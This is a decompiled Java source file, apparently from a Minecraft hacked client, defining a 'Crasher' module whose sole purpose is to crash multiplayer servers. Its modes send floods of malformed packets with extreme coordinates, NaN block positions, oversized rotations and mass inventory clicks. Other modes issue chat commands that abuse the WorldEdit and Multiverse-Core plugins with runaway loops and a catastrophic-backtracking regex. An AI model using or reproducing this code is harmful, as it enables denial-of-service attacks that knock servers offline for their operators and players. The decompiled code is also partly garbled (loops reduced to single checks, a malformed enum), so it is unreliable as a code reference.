//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\23204\Desktop\cn×îÇ¿·´±àÒëÆ÷\1.12 stable mappings"!

//Decompiled by Procyon!

package me.rebirthclient.mod.modules.impl.exploit;

import me.rebirthclient.mod.modules.settings.*;
import me.rebirthclient.mod.modules.*;
import net.minecraft.network.*;
import net.minecraft.inventory.*;
import net.minecraft.item.*;
import net.minecraft.util.math.*;
import net.minecraft.util.*;
import net.minecraft.network.play.client.*;

public class Crasher extends Module
{
    public final Setting packet;
    private final Setting logoutOff;
    public final Setting mode;
    
    public Crasher() {
        super("Crasher", "crash server", Category.EXPLOIT);
        this.packet = this.add(new Setting("Packet", 1000, 0, 3000));
        this.mode = this.add(new Setting("Mode", Mode.Chunk));
        this.logoutOff = this.add(new Setting("LogoutOff", true));
    }
    
    @Override
    public void onLogin() {
        if ((boolean)this.logoutOff.getValue() && this.isOn()) {
            this.disable();
        }
    }
    
    @Override
    public void onTick() {
        if (this.mode.getValue() == Mode.Chunk) {
            final double posY = Crasher.mc.player.posY;
            if (posY < 255.0) {
                Crasher.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Position(Crasher.mc.player.posX, posY, Crasher.mc.player.posZ, true));
                return;
            }
            final double n = 0.0;
            if (n < 6685.0) {
                Crasher.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Position(Crasher.mc.player.posX + n, 255.0, Crasher.mc.player.posZ + n, true));
            }
        }
        else if (this.mode.getValue() == Mode.Click) {
            int n2 = 0;
            if (n2 < (int)this.packet.getValue()) {
                Crasher.mc.player.connection.sendPacket((Packet)new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, new ItemStack(Crasher.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem()), (short)1));
                ++n2;
            }
        }
        else if (this.mode.getValue() == Mode.AAC) {
            int n3 = 0;
            if (n3 < 9999) {
                Crasher.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Position(Crasher.mc.player.posX + 9412 * n3, Crasher.mc.player.boundingBox.minY + 9412 * n3, Crasher.mc.player.posZ + 9412 * n3, true));
                ++n3;
            }
        }
        else if (this.mode.getValue() == Mode.NullPoint) {
            int n4 = 0;
            if (n4 < (int)this.packet.getValue()) {
                Crasher.mc.player.connection.sendPacket((Packet)new CPacketPlayerTryUseItemOnBlock(new BlockPos(Double.NaN, Double.NaN, Double.NaN), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0f, 0.0f, 0.0f));
                ++n4;
            }
        }
        else if (this.mode.getValue() == Mode.Rotation) {
            Crasher.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Rotation(9.223372E18f, 9.223372E18f, true));
        }
        else if (this.mode.getValue() == Mode.WorldEdit) {
            Crasher.mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
            this.disable();
        }
        else if (this.mode.getValue() == Mode.MultiverseCore) {
            Crasher.mc.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            this.disable();
        }
    }
    
    @Override
    public void onLogout() {
        if ((boolean)this.logoutOff.getValue() && this.isOn()) {
            this.disable();
        }
    }
    
    public enum Mode
    {
        Chunk("Chunk", 0);
        
        private static final Mode[] $VALUES;
        
        Rotation("Rotation", 4), 
        MultiverseCore("MultiverseCore", 6), 
        NullPoint("NullPoint", 3), 
        WorldEdit("WorldEdit", 5), 
        AAC("AAC", 2), 
        Click("Click", 1);
        
        static {
            $VALUES = new Mode[] { Mode.Chunk, Mode.Click, Mode.AAC, Mode.NullPoint, Mode.Rotation, Mode.WorldEdit, Mode.MultiverseCore };
        }
        
        private Mode(final String s, final int n) {
        }
    }
}
